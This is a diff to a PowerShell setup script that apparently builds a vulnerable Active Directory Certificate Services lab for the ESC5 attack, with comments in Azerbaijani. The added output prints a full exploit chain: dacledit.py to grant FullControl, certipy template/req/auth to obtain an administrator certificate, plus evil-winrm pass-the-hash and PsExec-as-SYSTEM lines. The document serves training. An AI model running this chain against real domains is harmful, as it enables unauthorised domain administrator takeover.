@@ -290,6 +290,14 @@ evil-winrm -i 10.10.10.10 -u administrator -H NTHash
     Aşağı imtiyazlı istifadəçi CA enrollment xidmətini modifikasiya
     edərək istənilən şablonu CA-ya bağlaya və ya CA davranışını
     dəyişdirə bilər.
+
+    Exploit zənciri (düzgün ardıcıllıq):
+      1. WriteDACL ilə Enrollment Services obyektinə özünə GenericAll ver
+      2. GenericAll sayəsində şablonun özünə WriteProperty əldə et
+      3. certipy template ilə şablonu ESC1-ə çevir
+      4. certipy req ilə SAN vasitəsilə sertifikat al
+      5. certipy auth ilə autentifikasiya et
+
     Kifayətsiz icazə halında SYSTEM kimi işlət:
         PsExec64.exe -s -i powershell.exe .\Setup-ESC5Lab.ps1
 
@@ -342,7 +350,7 @@ try {
         exit 1
     }
 
-    $caName  = $caObj.Name
+    $caName   = $caObj.Name
     $enrollDN = "CN=$caName,$enrollBase"
     Write-Ok "CA found: $caName"
     Write-Ok "Enrollment Services DN: $enrollDN"
@@ -410,28 +418,35 @@ Write-Host ""
 Write-Host "  Hədəf Obyekt  : $enrollDN" -ForegroundColor White
 Write-Host "    Vuln ACL    : WriteProperty + WriteDACL → Domain Users" -ForegroundColor White
 Write-Host ""
-Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
+Write-Host "  ── Exploit Zənciri ──────────────────────────────────" -ForegroundColor DarkGray
 Write-Host ""
 Write-Host "  # Step 1 — Mövcud vəziyyəti aşkar et" -ForegroundColor DarkGray
 Write-Host "  certipy find -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP -ldap-scheme ldap -stdout" -ForegroundColor Cyan
+Write-Host "      -dc-ip $dcIP -stdout" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 2 — Hədəf şablonu yedəklə və ESC1-ə çevir" -ForegroundColor DarkGray
+Write-Host "  # Step 2 — WriteDACL ilə Enrollment Services-ə özünə GenericAll ver" -ForegroundColor DarkGray
+Write-Host "  # (Bu addım olmadan certipy template şablona çata bilməz)" -ForegroundColor DarkGray
+Write-Host "  dacledit.py -action write -rights FullControl \`" -ForegroundColor Cyan
+Write-Host "      -principal 'lowuser' \`" -ForegroundColor Cyan
+Write-Host "      -target-dn '$enrollDN' \`" -ForegroundColor Cyan
+Write-Host "      -dc-ip $dcIP 'DOMAIN/lowuser:PASSWORD'" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  # Step 3 — Hədəf şablonu yedəklə və ESC1-ə çevir" -ForegroundColor DarkGray
 Write-Host "  certipy template -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP -template 'User' -save-old -ldap-scheme ldap" -ForegroundColor Cyan
+Write-Host "      -dc-ip $dcIP -template 'User' -save-old" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 3 — Administrator adına SAN ilə sertifikat al" -ForegroundColor DarkGray
+Write-Host "  # Step 4 — Administrator adına SAN ilə sertifikat al" -ForegroundColor DarkGray
 Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
 Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
 Write-Host "      -ca '$caName' -template 'User' \`" -ForegroundColor Cyan
-Write-Host "      -upn 'administrator@$domain' -ldap-scheme ldap" -ForegroundColor Cyan
+Write-Host "      -upn 'administrator@$domain'" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 4 — Authenticate" -ForegroundColor DarkGray
+Write-Host "  # Step 5 — Authenticate" -ForegroundColor DarkGray
 Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 5 — Şablonu bərpa et (opsional)" -ForegroundColor DarkGray
+Write-Host "  # Step 6 — Şablonu bərpa et (opsional)" -ForegroundColor DarkGray
 Write-Host "  certipy template -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
 Write-Host "      -dc-ip $dcIP -template 'User' \`" -ForegroundColor Cyan
-Write-Host "      -configuration User.json -ldap-scheme ldap" -ForegroundColor Cyan
+Write-Host "      -configuration User.json" -ForegroundColor Cyan
 Write-Host ""
 ```
